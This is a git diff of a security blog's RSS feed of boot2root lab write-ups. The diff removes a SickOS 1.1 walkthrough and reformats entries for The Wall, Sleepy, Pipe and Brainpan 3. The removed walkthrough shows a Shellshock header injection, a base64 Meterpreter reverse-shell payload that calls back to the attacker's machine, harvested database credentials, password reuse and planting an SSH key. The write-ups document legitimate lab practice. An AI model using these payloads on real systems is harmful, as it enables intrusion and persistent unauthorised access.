-* Connected to 192.168.50.105 (192.168.50.105) port 3128 (#0)
-&amp;gt; GET http://127.0.0.1/ HTTP/1.1
-&amp;gt; User-Agent: curl/7.38.0
-&amp;gt; Host: 127.0.0.1
-&amp;gt; Accept: */*
-&amp;gt; Proxy-Connection: Keep-Alive
-&amp;gt; 
-* HTTP 1.0, assume close after body
-&amp;lt; HTTP/1.0 200 OK
-&amp;lt; Date: Sat, 12 Dec 2015 14:04:49 GMT
-&amp;lt; Server: Apache/2.2.22 (Ubuntu)
-&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
-&amp;lt; Vary: Accept-Encoding
-&amp;lt; Content-Length: 21
-&amp;lt; Content-Type: text/html
-&amp;lt; X-Cache: MISS from localhost
-&amp;lt; X-Cache-Lookup: MISS from localhost:3128
-&amp;lt; Via: 1.0 localhost (squid/3.1.19)
-* HTTP/1.0 connection set to keep alive!
-&amp;lt; Connection: keep-alive
-&amp;lt; 
-&amp;lt;h1&amp;gt;
-BLEHHH!!!
-&amp;lt;/h1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Next I decided to try and find any other pages/directories that might reveal a webapp of some sort.  For this I used &lt;code&gt;dirbuster&lt;/code&gt;.  After a few seconds, it spat out an error concerning responses from pages that don&amp;rsquo;t exist.&lt;/p&gt;
-
-&lt;div align=&#34;center&#34;&gt;
-	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
-    
-        &lt;img src=&#34;https://rastamouse.me/img/writeups/sickos-1/dirbuster.jpg&#34;  /&gt;
-    
-    
-&lt;/figure&gt;
-&lt;/div&gt;
-
-&lt;p&gt;It&amp;rsquo;s accessing &lt;code&gt;/cgi-bin/status&lt;/code&gt; and no matter what comes after (i.e. &lt;code&gt;/cgi-bin/status/junk&lt;/code&gt;), the content of the script gets returned.  Dirbuster was getting confused because the uptime was obviously changing between requests.&lt;/p&gt;
-
-&lt;p&gt;Regardless, we have a cgi script that&amp;rsquo;s just screaming shellshock.&lt;/p&gt;
-
-&lt;h2 id=&#34;shellshock:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Shellshock&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128
-{ &amp;quot;uptime&amp;quot;: &amp;quot; 19:49:53 up 2:41, 1 user, load average: 0.00, 0.01, 0.01&amp;quot;, &amp;quot;kernel&amp;quot;: &amp;quot;Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux&amp;quot;}
-
-root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/id&amp;quot;
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Let&amp;rsquo;s try and get a reverse shell going - you could use something simple like a &lt;code&gt;nc -e /bin/sh&lt;/code&gt; or TCP reverse shell, but I thought I would spice things up with a bit of Meterpreter.  Confirm there is Python installed&amp;hellip;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/which python&amp;quot;
-/usr/bin/python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then generate a payload.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.50.101 LPORT=4444
-import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;UTF-8&#39;)}[sys.version_info[0]](&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=&#39;)))
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;shell:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Shell&lt;/h2&gt;
-
-&lt;p&gt;All you have to do to get this working is &lt;code&gt;/usr/bin/python -c&lt;/code&gt; and copy/paste the &lt;code&gt;msfvenom&lt;/code&gt; output, but make sure you escape the double-quote characters.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &amp;quot;() { :; }; echo; /usr/bin/python -c \&amp;quot;import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;UTF-8&#39;)}[sys.version_info[0]](&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=&#39;)))&amp;quot;\&amp;quot;
-
-msf exploit(handler) &amp;gt; exploit 
-
-[*] Started reverse handler on 192.168.50.101:4444 
-[*] Starting the payload handler...
-[*] Sending stage (36849 bytes) to 192.168.50.105
-[*] Meterpreter session 1 opened (192.168.50.101:4444 -&amp;gt; 192.168.50.105:40247) at 2015-12-12 14:24:19 +0000
-
-meterpreter &amp;gt; sysinfo 
-Computer     : SickOs
-OS           : Linux 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014
-Architecture : i686
-Meterpreter  : python/python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;After browsing the filesystem, we find some more things in &lt;code&gt;/var/www/&lt;/code&gt;, including the following file:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwxrwxrwx 1 root root  109 Dec  5 07:57 connect.py
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This set some alarm bells ringing, but I couldn&amp;rsquo;t find anywhere where this was getting executed as root (e.g a cron).  There is also a directory for &lt;code&gt;wolfcms&lt;/code&gt;, so we check that out.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls
-Listing: /var/www/wolfcms
-=========================
-
-Mode              Size  Type  Last modified              Name
-----              ----  ----  -------------              ----
-100755/rwxr-xr-x  950   fil   2015-12-05 02:13:03 +0000  .htaccess
-100777/rwxrwxrwx  4084  fil   2015-12-06 15:47:22 +0000  CONTRIBUTING.md
-100777/rwxrwxrwx  2405  fil   2015-12-06 15:47:22 +0000  README.md
-100777/rwxrwxrwx  403   fil   2015-12-06 15:47:22 +0000  composer.json
-100777/rwxrwxrwx  3058  fil   2015-12-06 15:47:22 +0000  config.php
-40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  docs
-100777/rwxrwxrwx  894   fil   2015-12-06 15:47:22 +0000  favicon.ico
-100777/rwxrwxrwx  6815  fil   2015-12-06 15:47:22 +0000  index.php
-40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  public
-100777/rwxrwxrwx  0     fil   2015-12-06 15:47:22 +0000  robots.txt
-40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  wolf
-
-
-meterpreter &amp;gt; cat config.php
-&amp;lt;?php 
-
-// Database information:
-// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
-// The path can only be absolute path or :memory:
-// For more info look at: www.php.net/pdo
-
-// Database settings:
-define(&#39;DB_DSN&#39;, &#39;mysql:dbname=wolf;host=localhost;port=3306&#39;);
-define(&#39;DB_USER&#39;, &#39;root&#39;);
-define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
-define(&#39;TABLE_PREFIX&#39;, &#39;&#39;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We can drop into a shell, connect to &lt;code&gt;mysql&lt;/code&gt; and see if we can find anything interesting.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ mysql -uroot -p
-Enter password: john@123
-
-mysql&amp;gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mysql              |
-| performance_schema |
-| wolf               |
-+--------------------+
-
-mysql&amp;gt; use wolf;
-
-mysql&amp;gt; show tables;
-+-----------------+
-| Tables_in_wolf  |
-+-----------------+
-| cron            |
-| layout          |
-| page            |
-| page_part       |
-| page_tag        |
-| permission      |
-| plugin_settings |
-| role            |
-| role_permission |
-| secure_token    |
-| setting         |
-| snippet         |
-| tag             |
-| user            |
-| user_role       |
-+-----------------+
-
-mysql&amp;gt; select * from user;
-+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
-| id | name          | email              | username | password                                                                                                                         | salt                                                             | language | last_login          | last_failure | failure_count | created_on          | updated_on          | created_by_id | updated_by_id |
-+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
-|  1 | Administrator | admin@yoursite.com | admin    | 3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f | 6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167 | en       | 2015-12-05 07:47:16 | NULL         |             0 | 2015-12-05 06:25:06 | 2015-12-05 07:47:16 |             1 |          NULL |
-+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And we can quickly grab the mysql users.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mysql&amp;gt; select * from mysql.user;
-+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
-| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |
-+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
-| localhost | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
-| sickos    | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
-| 127.0.0.1 | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
-| ::1       | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
-| localhost | debian-sys-maint | *CB98094782C386F2459D65D97B17D1DE15D1654B | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
-+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We notice that all the users are using the same hash, therefore the same password.  Sickos is also a user on the OS, so maybe they are using the same password?&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ su sickos
-Password: john@123
-bash: no job control in this shell
-sickos@SickOs:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Awesome.  Even though SSH is running on the system, Sickos has no keys.  So I used &lt;code&gt;ssh-keygen&lt;/code&gt; to create a new set of keys and the &lt;code&gt;.ssh&lt;/code&gt; directory, then echo&amp;rsquo;d my kali public key into the authorized_keys file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh sickos@192.168.50.105
-Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
-
-sickos@SickOs:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We see straight away that sickos is a member of the sudo group.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sickos@SickOs:~$ id
-uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
-
-sickos@SickOs:~$ sudo -l
-[sudo] password for sickos: 
-Matching Defaults entries for sickos on this host:
-    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User sickos may run the following commands on this host:
-    (ALL : ALL) ALL
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Which makes elevation trivial.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@SickOs:~# hostname; id
-SickOs
-uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;flag:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Flag&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@SickOs:~# cat /root/a0216ea4d51874464078c618298b1367.txt 
-If you are viewing this!!
-
-ROOT!
-
-You have Succesfully completed SickOS1.1.
-Thanks for Trying
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -1539,11 +1214,11 @@ Thanks for Trying
       <pubDate>Fri, 27 Nov 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/the-wall/</guid>
-      <description>
-
-&lt;p&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd&amp;rsquo;s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.&lt;/p&gt;
+      <description>&lt;p&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd&amp;rsquo;s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.&lt;/p&gt;
 
 &lt;p&gt;You challenge is simple&amp;hellip; set your controls for the heart of the sun, get root, and grab the flag! Rock on!&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://twitter.com/xerubus&#34;&gt;Xerubus&lt;/a&gt; asked if I would like to beta-test this VM prior to release and being a bit of a (closet) Pink Floyd fan, I jumped at the opportunity.  So obviously the first stage in any boot2root is to port scan the sucker.&lt;/p&gt;
 
@@ -1683,7 +1358,7 @@ f831605ae34c2399d1e5bb3a4ab245d0 == pinkfloydrocks
 
 &lt;p&gt;So we have what looks like a set of credentials.  &lt;code&gt;SydBarrett:pinkfloydrocks&lt;/code&gt;.  But where to use them?&lt;/p&gt;
 
-&lt;h2 id=&#34;sydbarrett:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;SydBarrett&lt;/h2&gt;
+&lt;h2 id=&#34;sydbarrett&#34;&gt;SydBarrett&lt;/h2&gt;
 
 &lt;p&gt;I was stuck here for a while, but if we do a &amp;lsquo;wider&amp;rsquo; port scan, we find that port 1965 is open.&lt;/p&gt;
 
@@ -1783,7 +1458,7 @@ Scalpel is done, files carved = 1, elapsed = 0 seconds.
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;rogerwaters:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;RogerWaters&lt;/h2&gt;
+&lt;h2 id=&#34;rogerwaters&#34;&gt;RogerWaters&lt;/h2&gt;
 
 &lt;p&gt;So now we have the password for RogerWaters, &lt;code&gt;hello_is_there_anybody_in_there&lt;/code&gt;. Let&amp;rsquo;s try and connect via SSH this time.&lt;/p&gt;
 
@@ -1818,7 +1493,7 @@ $
 
 &lt;p&gt;w00t shell.&lt;/p&gt;
 
-&lt;h2 id=&#34;nick-mason:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;Nick Mason&lt;/h2&gt;
+&lt;h2 id=&#34;nick-mason&#34;&gt;Nick Mason&lt;/h2&gt;
 
 &lt;p&gt;After some standard Linux enumeration, we get a list of all users on the system.  It&amp;rsquo;s logical to assume that we will have to progress through each user before reaching root.&lt;/p&gt;
 
@@ -1860,7 +1535,7 @@ $ whoami
 NickMason
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;richard-wright:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;Richard Wright&lt;/h2&gt;
+&lt;h2 id=&#34;richard-wright&#34;&gt;Richard Wright&lt;/h2&gt;
 
 &lt;p&gt;In each home directory thus far, there has been a profile picture of the band member.  Although Nick&amp;rsquo;s is something else in disguise.&lt;/p&gt;
 
@@ -1888,7 +1563,7 @@ $ id
 uid=1003(RichardWright) gid=1003(RichardWright) groups=1003(RichardWright)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;david-gilmour:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;David Gilmour&lt;/h2&gt;
+&lt;h2 id=&#34;david-gilmour&#34;&gt;David Gilmour&lt;/h2&gt;
 
 &lt;p&gt;Now we are Richard Wright, we can go back to the &lt;code&gt;shineon&lt;/code&gt; binary we found previously.&lt;/p&gt;
 
@@ -2073,7 +1748,7 @@ Congratulations... permission has been granted.
 You can now set your controls to the heart of the sun!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;root:692b9b8dc88c7093a6facc13d9ec511d&#34;&gt;root&lt;/h2&gt;
+&lt;h2 id=&#34;root&#34;&gt;root&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;permission granted&lt;/code&gt; is a little cryptic.  It took me a while to realise it had given DavidGilmour sudo rights.&lt;/p&gt;
 
@@ -2148,8 +1823,7 @@ root
 
 &lt;p&gt;It was also nice to read through the contents of &lt;code&gt;/root/scripts/&lt;/code&gt; to see how the VM works.&lt;/p&gt;
 
-&lt;p&gt;Many thanks to xerubus, and thanks for letting me beta-test :)&lt;/p&gt;
-</description>
+&lt;p&gt;Many thanks to xerubus, and thanks for letting me beta-test :)&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2158,11 +1832,11 @@ root
       <pubDate>Mon, 12 Oct 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/sleepy/</guid>
-      <description>
+      <description>&lt;p&gt;Sleepy is another ‘short’ VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt;, although it’s slightly more difficult than &lt;a href=&#34;http://rastamouse.me/blog/2015/dev-random-pipe/&#34;&gt;Pipe&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;Sleepy is another ‘short’ VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt;, although it’s slightly more difficult than &lt;a href=&#34;http://rastamouse.me/blog/2015/dev-random-pipe/&#34;&gt;Pipe&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;ports:98b6e5636154869990609b71ad7243a9&#34;&gt;Ports&lt;/h2&gt;
+&lt;h2 id=&#34;ports&#34;&gt;Ports&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -A 192.168.56.103
 PORT     STATE SERVICE VERSION
@@ -2175,7 +1849,7 @@ PORT     STATE SERVICE VERSION
 FTP allows anonymous login where you can download an image of Sleepy, but there appears to be nothing of interest with it.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;jserv:98b6e5636154869990609b71ad7243a9&#34;&gt;JServ&lt;/h2&gt;
+&lt;h2 id=&#34;jserv&#34;&gt;JServ&lt;/h2&gt;
 
 &lt;p&gt;Apache JServ is a really interesting protocol - it’s basically designed to proxy inbound requests from a web server through to an application server. If you try to access port 8009 directly, you get no response.&lt;/p&gt;
 
@@ -2217,7 +1891,7 @@ root@kali:~# service apache2 restart
 
 &lt;p&gt;I tried all the obvious/default passwords for Tomcat Manager, but no success. Time to turn my attention to JDWP.&lt;/p&gt;
 
-&lt;h2 id=&#34;jdwp:98b6e5636154869990609b71ad7243a9&#34;&gt;JDWP&lt;/h2&gt;
+&lt;h2 id=&#34;jdwp&#34;&gt;JDWP&lt;/h2&gt;
 
 &lt;p&gt;We find that we can attach to the JDWP service without any authentication.&lt;/p&gt;
 
@@ -2303,7 +1977,7 @@ USERNAME   sl33py
 meterpreter &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;tty-nightmare:98b6e5636154869990609b71ad7243a9&#34;&gt;TTY Nightmare&lt;/h2&gt;
+&lt;h2 id=&#34;tty-nightmare&#34;&gt;TTY Nightmare&lt;/h2&gt;
 
 &lt;p&gt;If we go in search for SUID binaries (owned by root), we find a suspicious looking candidate.&lt;/p&gt;
 
@@ -2451,7 +2125,7 @@ uid=0(root) gid=0(root) group=0(root),91(tomcat)
 
 &lt;p&gt;Sagi- has a nice trick for getting a proper interactive shell using &lt;code&gt;busybox&lt;/code&gt;, which you should definitely check out.&lt;/p&gt;
 
-&lt;h2 id=&#34;flag:98b6e5636154869990609b71ad7243a9&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2# cat /root/flag.txt
 Well done!
@@ -2461,8 +2135,7 @@ Here&#39;s your flag: 3eb030c6ab099b0a355712fe38d59ffb
 
 &lt;p&gt;This is the MD5 of &lt;code&gt;pewpewpew&lt;/code&gt; :)&lt;/p&gt;
 
-&lt;p&gt;Thanks Sagi- for another awesome VM - I learned a lot doing this one!&lt;/p&gt;
-</description>
+&lt;p&gt;Thanks Sagi- for another awesome VM - I learned a lot doing this one!&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2471,11 +2144,11 @@ Here&#39;s your flag: 3eb030c6ab099b0a355712fe38d59ffb
       <pubDate>Fri, 02 Oct 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/pipe/</guid>
-      <description>
+      <description>&lt;p&gt;Pipe was a VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt; for &lt;a href=&#34;http://zacon.org.za&#34;&gt;ZaCon&lt;/a&gt;.  It&amp;rsquo;s quite a short VM, presumably to fit confortably in a con session - but it&amp;rsquo;s fun nonetheless!&lt;/p&gt;
 
-&lt;p&gt;Pipe was a VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt; for &lt;a href=&#34;http://zacon.org.za&#34;&gt;ZaCon&lt;/a&gt;.  It&amp;rsquo;s quite a short VM, presumably to fit confortably in a con session - but it&amp;rsquo;s fun nonetheless!&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h1 id=&#34;scan-dem-ports:378c41c5fac16f89c224b95690922b7e&#34;&gt;Scan dem Ports&lt;/h1&gt;
+&lt;h1 id=&#34;scan-dem-ports&#34;&gt;Scan dem Ports&lt;/h1&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.102
 
@@ -2502,7 +2175,7 @@ PORT      STATE SERVICE VERSION
 36100/tcp open  status  1 (RPC #100024)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;verb-abuse:378c41c5fac16f89c224b95690922b7e&#34;&gt;Verb Abuse&lt;/h2&gt;
+&lt;h2 id=&#34;verb-abuse&#34;&gt;Verb Abuse&lt;/h2&gt;
 
 &lt;p&gt;Hop on over to the web service, and we&amp;rsquo;re blocked by an authorisation prompt.&lt;/p&gt;
 
@@ -2649,7 +2322,7 @@ meterpreter &amp;gt; getuid
 Server username: www-data (33)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;rene:378c41c5fac16f89c224b95690922b7e&#34;&gt;Rene&lt;/h2&gt;
+&lt;h2 id=&#34;rene&#34;&gt;Rene&lt;/h2&gt;
 
 &lt;p&gt;After looking around the file system a bit, I spotted some files in rene&amp;rsquo;s home directory.&lt;/p&gt;
 
@@ -2707,7 +2380,7 @@ whoami
 root
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:378c41c5fac16f89c224b95690922b7e&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                  .aMccccccccc*YMMn.    `Mb
@@ -2753,8 +2426,7 @@ Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  8
                                                                   888                                                   888        888
 Well Done!
 Here&#39;s your flag: 0089cd4f9ae79402cdd4e7b8931892b7
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -2763,9 +2435,9 @@ Here&#39;s your flag: 0089cd4f9ae79402cdd4e7b8931892b7
       <pubDate>Sat, 26 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/brainpan-3-part-2/</guid>
-      <description>
+      <description>&lt;p&gt;Now that we&amp;rsquo;ve popped &lt;code&gt;anansi&lt;/code&gt; and &lt;code&gt;reynard&lt;/code&gt;, it&amp;rsquo;s time to go after &lt;code&gt;puck&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;!&lt;/p&gt;
 
-&lt;p&gt;Now that we&amp;rsquo;ve popped &lt;code&gt;anansi&lt;/code&gt; and &lt;code&gt;reynard&lt;/code&gt;, it&amp;rsquo;s time to go after &lt;code&gt;puck&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;There is something listening on the loopback at port &lt;code&gt;7075&lt;/code&gt;.  When we connect, we get a message about a key.&lt;/p&gt;
 
@@ -2845,7 +2517,7 @@ Key file is compromised.
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;a-race-to-win:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Race to Win&lt;/h2&gt;
+&lt;h2 id=&#34;a-race-to-win&#34;&gt;A Race to Win&lt;/h2&gt;
 
